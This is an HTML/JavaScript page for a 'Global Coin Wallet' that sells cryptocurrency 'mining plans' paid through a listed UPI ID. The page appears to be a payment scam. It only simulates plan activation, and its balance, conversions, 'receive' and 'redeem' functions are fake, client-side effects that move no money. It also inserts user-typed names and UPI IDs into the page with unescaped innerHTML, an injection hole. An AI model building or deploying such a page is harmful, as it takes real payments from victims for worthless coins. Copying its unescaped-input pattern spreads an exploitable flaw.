<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Global Coin Wallet</title>
  <style>
    body {
      font-family: sans-serif;
      margin: 0;
      padding: 0;
      background-color: #121212;
      color: white;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      padding: 20px;
    }
    .dark-light-switch {
      position: fixed;
      top: 10px;
      right: 10px;
    }
    .card {
      background: #1f1f1f;
      padding: 20px;
      margin-bottom: 10px;
      border-radius: 10px;
      box-shadow: 0 0 5px rgba(255, 255, 255, 0.1);
    }
    button {
      background: #00bcd4;
      color: white;
      border: none;
      padding: 10px;
      border-radius: 5px;
      cursor: pointer;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      margin-bottom: 10px;
      border: none;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <div class="dark-light-switch">
    <button onclick="toggleTheme()">üåì Toggle Dark/Light</button>
  </div>
  <div class="container">
    <h1>üåê Global Coin Wallet</h1>
    <div class="card">
      <h3>Balance: <span id="balance">0</span> GLBC</h3>
      <h4>INR: ‚Çπ<span id="inr">0</span> | USD: $<span id="usd">0</span> | EUR: ‚Ç¨<span id="eur">0</span></h4>
    </div><div class="card">
  <h3>Buy Mining Plan</h3>
  <select id="plan">
    <option value="500">Basic - ‚Çπ500</option>
    <option value="1500">Pro - ‚Çπ1500</option>
    <option value="2799">Turbo - ‚Çπ2799</option>
    <option value="6500">Ultra - ‚Çπ6500</option>
  </select>
  <button onclick="goToPayment()">Proceed to Payment</button>
</div>

<div class="card">
  <h3>Send Coins</h3>
  <input type="text" id="sendTo" placeholder="Recipient Username" />
  <input type="number" id="sendAmount" placeholder="Amount to Send" />
  <button onclick="sendCoins()">Send</button>
</div>

<div class="card">
  <h3>Receive Coins</h3>
  <input type="text" id="fromUser" placeholder="Sender Username" />
  <input type="number" id="receiveAmount" placeholder="Amount to Receive" />
  <button onclick="receiveCoins()">Receive</button>
</div>

<div class="card">
  <h3>Redeem Coins</h3>
  <input type="text" id="upi" placeholder="Your UPI ID" />
  <button onclick="redeemCoins()">Redeem 10,000 GLBC</button>
</div>

<div class="card">
  <h3>Transaction Logs</h3>
  <div id="logs"></div>
</div>

  </div>  <script>
    let isDark = true;
    function toggleTheme() {
      document.body.style.backgroundColor = isDark ? '#ffffff' : '#121212';
      document.body.style.color = isDark ? '#000000' : '#ffffff';
      isDark = !isDark;
    }

    const balanceEl = document.getElementById("balance");
    const inrEl = document.getElementById("inr");
    const usdEl = document.getElementById("usd");
    const eurEl = document.getElementById("eur");
    const logs = document.getElementById("logs");
    let balance = 0;

    function updateValues() {
      balanceEl.textContent = balance;
      inrEl.textContent = (balance * 10).toFixed(2);
      usdEl.textContent = (balance * 0.12).toFixed(2);
      eurEl.textContent = (balance * 0.11).toFixed(2);
    }

    function goToPayment() {
      alert("Scan the UPI QR code: 7604909512@fam\nYou have 5 minutes to complete the payment.");
      setTimeout(() => {
        balance += 100; // Simulate plan activation
        updateValues();
        logs.innerHTML += `<p>‚úîÔ∏è Mining Plan Activated. +100 GLBC</p>`;
      }, 5000);
    }

    function sendCoins() {
      const to = document.getElementById("sendTo").value;
      const amount = parseFloat(document.getElementById("sendAmount").value);
      if (amount > balance) {
        alert("Insufficient balance.");
        return;
      }
      balance -= amount;
      updateValues();
      logs.innerHTML += `<p>üîÅ Sent ${amount} GLBC to ${to}</p>`;
    }

    function receiveCoins() {
      const from = document.getElementById("fromUser").value;
      const amount = parseFloat(document.getElementById("receiveAmount").value);
      balance += amount;
      updateValues();
      logs.innerHTML += `<p>üì• Received ${amount} GLBC from ${from}</p>`;
    }

    function redeemCoins() {
      if (balance < 10000) {
        alert("Minimum 10,000 GLBC required to redeem.");
        return;
      }
      const upi = document.getElementById("upi").value;
      alert(`Redeem request sent to ${upi}.`);
      balance -= 10000;
      updateValues();
      logs.innerHTML += `<p>üí∏ Redeemed 10,000 GLBC to ${upi}</p>`;
    }
  </script></body>
</html>
